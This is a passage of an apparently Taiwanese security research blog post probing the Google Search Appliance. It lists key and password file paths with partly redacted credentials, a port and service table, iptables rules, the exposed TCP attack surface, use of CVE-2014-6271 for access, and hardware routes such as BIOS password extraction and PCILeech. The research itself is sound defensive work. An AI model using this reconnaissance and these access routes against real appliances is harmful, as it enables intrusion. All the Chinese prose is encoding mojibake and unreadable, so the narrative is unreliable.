  &lt;li&gt;/export/hda3/versionmanager/google_key.symmetric Êúâ‰∏ÄÊääÁñë‰ººÁÇ∫Â∞çÁ®±ÂºèÂä†ÂØÜ‰ΩøÁî®ÁöÑÂØÜÁ¢º&lt;/li&gt;
  &lt;li&gt;/export/hda3/versionmanager/vmanager_passwd Â≠òÂú®ÂÖ©ÁµÑÂ∏≥ÂØÜÁµÑÂêà ( adminÔºö M‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñàw=:9‚ñà‚ñà=  googleÔºöw‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñào=:N‚ñà‚ñà=  )&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;ËÄåÂÖ∑ÊúâÁ∂≤Ë∑ØÊúçÂãôÁöÑÂü∑Ë°åÁ®ãÂºèÁöÑËßÄÂØüÂ¶Ç‰∏ãÔºö&lt;/p&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;ÈÄöË®äÂü†&lt;/th&gt;
      &lt;th&gt;ÊúçÂãôÂêçÁ®±&lt;/th&gt;
      &lt;th&gt;Á®ãÂºèÁ∑®ÂØ´Ë™ûË®Ä&lt;/th&gt;
      &lt;th&gt;ÊúçÂãôË™™Êòé&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;22&lt;/td&gt;
      &lt;td&gt;ssh&lt;/td&gt;
      &lt;td&gt;C/C++&lt;/td&gt;
      &lt;td&gt;OpenSSH Server&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;53&lt;/td&gt;
      &lt;td&gt;named&lt;/td&gt;
      &lt;td&gt;C/C++&lt;/td&gt;
      &lt;td&gt;Bind Named&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;953&lt;/td&gt;
      &lt;td&gt;named&lt;/td&gt;
      &lt;td&gt;C/C++&lt;/td&gt;
      &lt;td&gt;Bind Named&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;1111&lt;/td&gt;
      &lt;td&gt;webserver_config&lt;/td&gt;
      &lt;td&gt;python&lt;/td&gt;
      &lt;td&gt;Installer&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;2100&lt;/td&gt;
      &lt;td&gt;adminrunner.py&lt;/td&gt;
      &lt;td&gt;python&lt;/td&gt;
      &lt;td&gt;enterpriseconsole backend&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;3990&lt;/td&gt;
      &lt;td&gt;monitor&lt;/td&gt;
      &lt;td&gt;C/C++&lt;/td&gt;
      &lt;td&gt;monitor&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;4000&lt;/td&gt;
      &lt;td&gt;rtserver&lt;/td&gt;
      &lt;td&gt;C/C++&lt;/td&gt;
      &lt;td&gt;Êú™Áü•&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;4430&lt;/td&gt;
      &lt;td&gt;EnterpriseFrontend&lt;/td&gt;
      &lt;td&gt;Java (with security manager)&lt;/td&gt;
      &lt;td&gt;https ÂâçÁ´Ø&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;4911&lt;/td&gt;
      &lt;td&gt;borgmon&lt;/td&gt;
      &lt;td&gt;C/C++&lt;/td&gt;
      &lt;td&gt;borgmon&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;4916&lt;/td&gt;
      &lt;td&gt;reactor&lt;/td&gt;
      &lt;td&gt;C/C++&lt;/td&gt;
      &lt;td&gt;Êú™Áü•&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;5000&lt;/td&gt;
      &lt;td&gt;rtserver&lt;/td&gt;
      &lt;td&gt;C/C++&lt;/td&gt;
      &lt;td&gt;Êú™Áü•&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;5600&lt;/td&gt;
      &lt;td&gt;rtserver&lt;/td&gt;
      &lt;td&gt;C/C++&lt;/td&gt;
      &lt;td&gt;Êú™Áü•&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;6600&lt;/td&gt;
      &lt;td&gt;cacheserver&lt;/td&gt;
      &lt;td&gt;C/C++&lt;/td&gt;
      &lt;td&gt;Êú™Áü•&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;7800&lt;/td&gt;
      &lt;td&gt;EnterpriseFrontend&lt;/td&gt;
      &lt;td&gt;Java (with security manager)&lt;/td&gt;
      &lt;td&gt;Êú™Áü•&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;7880&lt;/td&gt;
      &lt;td&gt;TableServer&lt;/td&gt;
      &lt;td&gt;Java (with security manager)&lt;/td&gt;
      &lt;td&gt;Êú™Áü•&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;7882&lt;/td&gt;
      &lt;td&gt;AuthzChecker&lt;/td&gt;
      &lt;td&gt;Java (without security manager)&lt;/td&gt;
      &lt;td&gt;Êú™Áü•&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;7886&lt;/td&gt;
      &lt;td&gt;tomcat&lt;/td&gt;
      &lt;td&gt;Java&lt;/td&gt;
      &lt;td&gt;tomcat server&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;8000&lt;/td&gt;
      &lt;td&gt;EnterpriseAdminConsole&lt;/td&gt;
      &lt;td&gt;Java (without security manager)&lt;/td&gt;
      &lt;td&gt;Êú™Áü•&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;8443&lt;/td&gt;
      &lt;td&gt;stunnel&lt;/td&gt;
      &lt;td&gt;C/C++&lt;/td&gt;
      &lt;td&gt;redirect http to https&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;8888&lt;/td&gt;
      &lt;td&gt;GWS&lt;/td&gt;
      &lt;td&gt;C/C++&lt;/td&gt;
      &lt;td&gt;Êú™Áü•&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;9300&lt;/td&gt;
      &lt;td&gt;oneboxserver&lt;/td&gt;
      &lt;td&gt;C/C++&lt;/td&gt;
      &lt;td&gt;Êú™Áü•&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;9328&lt;/td&gt;
      &lt;td&gt;entspellmixer&lt;/td&gt;
      &lt;td&gt;C/C++&lt;/td&gt;
      &lt;td&gt;Êú™Áü•&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;9400&lt;/td&gt;
      &lt;td&gt;mixserver&lt;/td&gt;
      &lt;td&gt;C/C++&lt;/td&gt;
      &lt;td&gt;Êú™Áü•&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;9402&lt;/td&gt;
      &lt;td&gt;mixserver&lt;/td&gt;
      &lt;td&gt;C/C++&lt;/td&gt;
      &lt;td&gt;Êú™Áü•&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;9448&lt;/td&gt;
      &lt;td&gt;qrewrite&lt;/td&gt;
      &lt;td&gt;C/C++&lt;/td&gt;
      &lt;td&gt;Êú™Áü•&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;9450&lt;/td&gt;
      &lt;td&gt;EnterpriseAdminConsole&lt;/td&gt;
      &lt;td&gt;Java (without security manager )&lt;/td&gt;
      &lt;td&gt;Êú™Áü•&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;10094&lt;/td&gt;
      &lt;td&gt;enterprise_onebox&lt;/td&gt;
      &lt;td&gt;C/C++&lt;/td&gt;
      &lt;td&gt;Êú™Áü•&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;10200&lt;/td&gt;
      &lt;td&gt;clustering_server&lt;/td&gt;
      &lt;td&gt;C/C++&lt;/td&gt;
      &lt;td&gt;Êú™Áü•&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;11913&lt;/td&gt;
      &lt;td&gt;sessionmanager&lt;/td&gt;
      &lt;td&gt;C/C++&lt;/td&gt;
      &lt;td&gt;Êú™Áü•&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;12345&lt;/td&gt;
      &lt;td&gt;RegistryServer&lt;/td&gt;
      &lt;td&gt;Java (without security manager)&lt;/td&gt;
      &lt;td&gt;Êú™Áü•&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;19780&lt;/td&gt;
      &lt;td&gt;configmgr/ent_configmgr.py&lt;/td&gt;
      &lt;td&gt;python&lt;/td&gt;
      &lt;td&gt;Êú™Áü•&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;19900&lt;/td&gt;
      &lt;td&gt;feedergate&lt;/td&gt;
      &lt;td&gt;C/C++&lt;/td&gt;
      &lt;td&gt;Êú™Áü•&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;21200&lt;/td&gt;
      &lt;td&gt;FileSystemGateway&lt;/td&gt;
      &lt;td&gt;Java (with security manager)&lt;/td&gt;
      &lt;td&gt;Êú™Áü•&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;31300&lt;/td&gt;
      &lt;td&gt;rtserver&lt;/td&gt;
      &lt;td&gt;C/C++&lt;/td&gt;
      &lt;td&gt;Êú™Áü•&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;ÈõñÁÑ∂ÊúâÈÄôÈ∫ºÂ§öÊúçÂãôÔºå‰ΩÜÊòØ iptables ÈòªÊìã‰∫ÜÂ§ßÈÉ®ÂàÜÁöÑÈÄ£Á∑öÔºå‰ª•‰∏ãÊòØ iptables Ë®≠ÂÆöÔºö&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# Redirect privileged ports.&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# (we listen as nobody, which can&apos;t attach to low ports, so redirect to high ports)&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;#&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;-A&lt;/span&gt; PREROUTING &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; eth0 &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; tcp &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; tcp &lt;span class=&quot;nt&quot;&gt;--dport&lt;/span&gt; 80 &lt;span class=&quot;nt&quot;&gt;-j&lt;/span&gt; REDIRECT &lt;span class=&quot;nt&quot;&gt;--to-ports&lt;/span&gt; 7800
&lt;span class=&quot;nt&quot;&gt;-A&lt;/span&gt; PREROUTING &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; eth0 &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; tcp &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; tcp &lt;span class=&quot;nt&quot;&gt;--dport&lt;/span&gt; 443 &lt;span class=&quot;nt&quot;&gt;-j&lt;/span&gt; REDIRECT &lt;span class=&quot;nt&quot;&gt;--to-ports&lt;/span&gt; 4430
&lt;span class=&quot;nt&quot;&gt;-A&lt;/span&gt; PREROUTING &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; eth0 &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; tcp &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; tcp &lt;span class=&quot;nt&quot;&gt;--dport&lt;/span&gt; 444 &lt;span class=&quot;nt&quot;&gt;-j&lt;/span&gt; REDIRECT &lt;span class=&quot;nt&quot;&gt;--to-ports&lt;/span&gt; 4431
&lt;span class=&quot;nt&quot;&gt;-A&lt;/span&gt; INPUT &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; eth0 &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; udp &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; state &lt;span class=&quot;nt&quot;&gt;--state&lt;/span&gt; ESTABLISHED,RELATED &lt;span class=&quot;nt&quot;&gt;-j&lt;/span&gt; ACCEPT
&lt;span class=&quot;nt&quot;&gt;-A&lt;/span&gt; INPUT &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; eth0 &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; tcp &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; tcp &lt;span class=&quot;nt&quot;&gt;--dport&lt;/span&gt; 22 &lt;span class=&quot;nt&quot;&gt;-j&lt;/span&gt; ACCEPT
&lt;span class=&quot;nt&quot;&gt;-A&lt;/span&gt; INPUT &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; eth0 &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; tcp &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; tcp &lt;span class=&quot;nt&quot;&gt;--dport&lt;/span&gt; 7800 &lt;span class=&quot;nt&quot;&gt;-j&lt;/span&gt; ACCEPT
&lt;span class=&quot;nt&quot;&gt;-A&lt;/span&gt; INPUT &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; eth0 &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; tcp &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; tcp &lt;span class=&quot;nt&quot;&gt;--dport&lt;/span&gt; 7801 &lt;span class=&quot;nt&quot;&gt;-j&lt;/span&gt; ACCEPT
&lt;span class=&quot;nt&quot;&gt;-A&lt;/span&gt; INPUT &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; eth0 &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; tcp &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; tcp &lt;span class=&quot;nt&quot;&gt;--dport&lt;/span&gt; 4430 &lt;span class=&quot;nt&quot;&gt;-j&lt;/span&gt; ACCEPT
&lt;span class=&quot;nt&quot;&gt;-A&lt;/span&gt; INPUT &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; eth0 &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; tcp &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; tcp &lt;span class=&quot;nt&quot;&gt;--dport&lt;/span&gt; 4431 &lt;span class=&quot;nt&quot;&gt;-j&lt;/span&gt; ACCEPT
&lt;span class=&quot;nt&quot;&gt;-A&lt;/span&gt; INPUT &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; eth0 &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; tcp &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; tcp &lt;span class=&quot;nt&quot;&gt;--dport&lt;/span&gt; 19900 &lt;span class=&quot;nt&quot;&gt;-j&lt;/span&gt; ACCEPT
&lt;span class=&quot;nt&quot;&gt;-A&lt;/span&gt; INPUT &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; eth0 &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; tcp &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; tcp &lt;span class=&quot;nt&quot;&gt;--dport&lt;/span&gt; 8000 &lt;span class=&quot;nt&quot;&gt;-j&lt;/span&gt; ACCEPT
&lt;span class=&quot;nt&quot;&gt;-A&lt;/span&gt; INPUT &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; eth0 &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; tcp &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; tcp &lt;span class=&quot;nt&quot;&gt;--dport&lt;/span&gt; 8443 &lt;span class=&quot;nt&quot;&gt;-j&lt;/span&gt; ACCEPT
&lt;span class=&quot;nt&quot;&gt;-A&lt;/span&gt; INPUT &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; eth0 &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; tcp &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; tcp &lt;span class=&quot;nt&quot;&gt;--dport&lt;/span&gt; 9941 &lt;span class=&quot;nt&quot;&gt;-j&lt;/span&gt; ACCEPT
&lt;span class=&quot;nt&quot;&gt;-A&lt;/span&gt; INPUT &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; eth0 &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; tcp &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; tcp &lt;span class=&quot;nt&quot;&gt;--dport&lt;/span&gt; 9942 &lt;span class=&quot;nt&quot;&gt;-j&lt;/span&gt; ACCEPT
&lt;span class=&quot;nt&quot;&gt;-A&lt;/span&gt; INPUT &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; eth0 &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; tcp &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; tcp &lt;span class=&quot;nt&quot;&gt;--dport&lt;/span&gt; 10999 &lt;span class=&quot;nt&quot;&gt;-j&lt;/span&gt; ACCEPT
&lt;span class=&quot;nt&quot;&gt;-A&lt;/span&gt; OUTPUT &lt;span class=&quot;nt&quot;&gt;-o&lt;/span&gt; eth0 &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; udp &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; udp &lt;span class=&quot;nt&quot;&gt;--sport&lt;/span&gt; 68 &lt;span class=&quot;nt&quot;&gt;--dport&lt;/span&gt; 67 &lt;span class=&quot;nt&quot;&gt;-j&lt;/span&gt; ACCEPT
&lt;span class=&quot;nt&quot;&gt;-A&lt;/span&gt; OUTPUT &lt;span class=&quot;nt&quot;&gt;-o&lt;/span&gt; eth0 &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; udp &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; udp &lt;span class=&quot;nt&quot;&gt;--dport&lt;/span&gt; 53 &lt;span class=&quot;nt&quot;&gt;-j&lt;/span&gt; ACCEPT
&lt;span class=&quot;nt&quot;&gt;-A&lt;/span&gt; OUTPUT &lt;span class=&quot;nt&quot;&gt;-o&lt;/span&gt; eth0 &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; udp &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; udp &lt;span class=&quot;nt&quot;&gt;--dport&lt;/span&gt; 137:138 &lt;span class=&quot;nt&quot;&gt;-j&lt;/span&gt; ACCEPT
&lt;span class=&quot;nt&quot;&gt;-A&lt;/span&gt; OUTPUT &lt;span class=&quot;nt&quot;&gt;-o&lt;/span&gt; eth0 &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; udp &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; udp &lt;span class=&quot;nt&quot;&gt;--dport&lt;/span&gt; 123 &lt;span class=&quot;nt&quot;&gt;-j&lt;/span&gt; ACCEPT
&lt;span class=&quot;nt&quot;&gt;-A&lt;/span&gt; OUTPUT &lt;span class=&quot;nt&quot;&gt;-o&lt;/span&gt; eth0 &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; udp &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; udp &lt;span class=&quot;nt&quot;&gt;--dport&lt;/span&gt; 514 &lt;span class=&quot;nt&quot;&gt;-j&lt;/span&gt; ACCEPT
&lt;span class=&quot;nt&quot;&gt;-A&lt;/span&gt; INPUT &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; eth0 &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; udp &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; udp &lt;span class=&quot;nt&quot;&gt;--dport&lt;/span&gt; 161 &lt;span class=&quot;nt&quot;&gt;-j&lt;/span&gt; ACCEPT
&lt;span class=&quot;nt&quot;&gt;-A&lt;/span&gt; OUTPUT &lt;span class=&quot;nt&quot;&gt;-o&lt;/span&gt; eth0 &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; udp &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; udp &lt;span class=&quot;nt&quot;&gt;--sport&lt;/span&gt; 161 &lt;span class=&quot;nt&quot;&gt;-j&lt;/span&gt; ACCEPT
&lt;span class=&quot;nt&quot;&gt;-A&lt;/span&gt; OUTPUT &lt;span class=&quot;nt&quot;&gt;-o&lt;/span&gt; eth0 &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; udp &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; udp &lt;span class=&quot;nt&quot;&gt;--dport&lt;/span&gt; 162 &lt;span class=&quot;nt&quot;&gt;-j&lt;/span&gt; ACCEPT
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Êï¥ÁêÜÂá∫‰æÜÂØ¶ÈöõÂèØÂ≠òÂèñÁöÑTCP ÊîªÊìäÈù¢Ôºö&lt;/p&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;ÈÄöË®äÂü†&lt;/th&gt;
      &lt;th&gt;ÊúçÂãôÂêçÁ®±&lt;/th&gt;
      &lt;th&gt;Á®ãÂºèÂü∑Ë°åÊ™îÊâÄÂú®‰ΩçÁΩÆ&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;22&lt;/td&gt;
      &lt;td&gt;ssh&lt;/td&gt;
      &lt;td&gt;/usr/sbin/sshd&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;7800&lt;/td&gt;
      &lt;td&gt;EnterpriseFrontend&lt;/td&gt;
      &lt;td&gt;/export/hda3/5.2.0/local/google/bin/EnterpriseFrontend.jar&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;4430&lt;/td&gt;
      &lt;td&gt;EnterpriseFrontend&lt;/td&gt;
      &lt;td&gt;/export/hda3/5.2.0/local/google/bin/EnterpriseFrontend.jar&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;19900&lt;/td&gt;
      &lt;td&gt;feedergate&lt;/td&gt;
      &lt;td&gt;/export/hda3/5.2.0/local/google/bin/feedergate&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;8000&lt;/td&gt;
      &lt;td&gt;EnterpriseAdminConsole&lt;/td&gt;
      &lt;td&gt;/export/hda3/5.2.0/local/google/bin/EnterpriseAdminConsole.jar&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;8443&lt;/td&gt;
      &lt;td&gt;stunnel&lt;/td&gt;
      &lt;td&gt;/usr/sbin/stunnel&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;ËÄåÊàëÂÄëÁôºÁèæ  &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/export/hda3/versionmanager/google_key.symmetric&lt;/code&gt; ‰∏≠ÁöÑÂ≠ó‰∏≤ÂèØ‰ª•Áî®‰æÜËß£ÂØÜÊâÄÊúâ install_bundle ÁöÑÂÖßÂÆπÔºÅ
‰ΩøÁî® CVE-2014-6271 ÂèñÂæóÊ¨äÈôêÂä†‰∏äÂèØ‰ª•Ëß£Âá∫ install bundle ‰∏≠ÁöÑÂÖßÂÆπÂæåÔºåÂ∞ç vGSA ÁöÑÁ†îÁ©∂Â∞±Êö´ÊôÇÂëä‰∏ÄÊÆµËêΩÔºå
ÂÖ∂Âü∑Ë°åÁí∞Â¢É‰∏≠Ë®òÊÜ∂È´îÁöÑ‰øùË≠∑ËºÉÁÇ∫Áº∫Â∞ëÔºåÂèØËÉΩÊúâÊ©üÊúÉÂ≠òÂú®Âº±Èªû‰∏¶Âà©Áî®Ôºö&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20230707/6.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;gsa&quot;&gt;GSA&lt;/h3&gt;

&lt;p&gt;ÂÆâË£ùË®≠ÂÇôÂæåÂòóË©¶Êõ¥ÊîπÈñãÊ©üÈ†ÜÂ∫èÔºå‰ΩÜÁôºÁèæÈÄ≤ÂÖ•BIOSÈúÄË¶ÅÂØÜÁ¢ºÔºå‰∏îÁ£ÅÁ¢ü‰ªãÈù¢Âç°ÁöÑÁÆ°ÁêÜ‰ªãÈù¢‰∏≠ Dell H700 ÂÉÖÊúâÈÉ®ÂàÜÂäüËÉΩÂèØ‰ª•Êìç‰ΩúÔºö
&lt;img src=&quot;/assets/img/blog/20230707/7.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Êé•ËëóÂòóË©¶Áõ¥Êé•ËÆÄÂèñÁ°¨Á¢üÂÖßÂÆπÔºåÂ¶ÇÊûúÁ°¨Á¢üÂÖßÂÆπÊ≤íÊúâÂä†ÂØÜÔºåÊúâÊ©üÊúÉËÉΩÁõ¥Êé•ÂèñÂæóË®≠ÂÇô‰ΩúÊ•≠Á≥ªÁµ±ÂèäËªüÈ´î„ÄÇ
ÊàëÂÄëÁôºÁèæÂÖ∂Á°¨Á¢ü‰ΩøÁî®SAS ‰ªãÈù¢ÈÄ≤Ë°åÂÇ≥Ëº∏ÔºåÂòóË©¶ÂâçÈÇÑÈúÄË≥ºË≤∑SAS Âç°ÔºåÊú¨Ê¨°Ê∏¨Ë©¶‰ΩøÁî®LSI 9211-8i ÈÄ≤Ë°åÈÄ£ÁµêÔºö&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20230707/8.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;ÈÄ£Êé•ÂòóË©¶ËÆÄÂèñÂæåÁôºÁèæÂà∞ÈÄôÊòØ‰∏ÄÂÄãËá™ÊàëÂä†ÂØÜ SED Á£ÅÁ¢üÔºåÈúÄË¶ÅÂØÜÁ¢ºunlock ÊâçËÉΩÂ≠òÂèñÔºåOSSLab ÈÄôÈÇäÊúâÊõ¥Ë©≥Á¥∞ÁöÑËß£ÈáãÔºö&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://www.osslab.com.tw/ata-sed-security/&quot;&gt;https://www.osslab.com.tw/ata-sed-security/&lt;/a&gt; (‰∏≠Êñá)&lt;/p&gt;

&lt;p&gt;Âú®ÁÑ°Ê≥ïÁõ¥Êé•Â≠òÂèñÁ°¨Á¢üÁöÑÊÉÖÊ≥Å‰∏ãÊúâÂπæÁ®ÆÊñπÂºèÂèØ‰ª•ÁπºÁ∫åÂòóË©¶Ôºö&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;ÂòóË©¶ËÆÄÂá∫ÊñºBIOS EEPROM ‰∏≠ÁöÑÂØÜÁ¢ºÔºå‰∏¶Êõ¥ÊîπÈñãÊ©üÈ†ÜÂ∫è&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Ê≠§ÊñπÂºèÈúÄË¶ÅÁ†¥Â£û‰∏ªÊ©üÊùøÔºåÊúâ‰∏ÄÂÆöÈ¢®Èö™ÔºåÊñºËªüÈ´îÂ±§Êâæ‰∏çÂà∞ÊºèÊ¥ûÊâçÊúÉ‰ΩøÁî®Ê≠§Á®ÆÊñπÂºè„ÄÇ
ÂèØÂèÉËÄÉÈÄôÁØáÁ†îÁ©∂ &lt;a href=&quot;https://blog.cybercx.co.nz/bypassing-bios-password&quot;&gt;https://blog.cybercx.co.nz/bypassing-bios-password&lt;/a&gt; (Ëã±Êñá)&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;‰ΩøÁî® PCILeech ËÆÄÂèñ„ÄÅÂØ´ÂÖ•Ë®òÊÜ∂È´î‰∏¶ÂèñÂæóÁ≥ªÁµ±Ê¨äÈôê&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Ê≠§ÊñπÂºèÈúÄË¶ÅÁâπÂÆöPCI-e Ë®≠ÂÇôÔºåÁï∂ÊôÇÈÇÑÊ≤íÊúâÊ∫ñÂÇôÊ≠§È°ûË®≠ÂÇô„ÄÇÂèØ‰ª•ÂèÉËÄÉÈÄôÂÄã github Â∞àÊ°àÔºö&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://github.com/ufrisk/pcileech&quot;&gt;https://github.com/ufrisk/pcileech&lt;/a&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Â∞ãÊâæÂèØÂ≠òÂèñÊúçÂãô‰πãËªüÈ´îÊºèÊ¥û&lt;/li&gt;
&lt;/ul&gt;

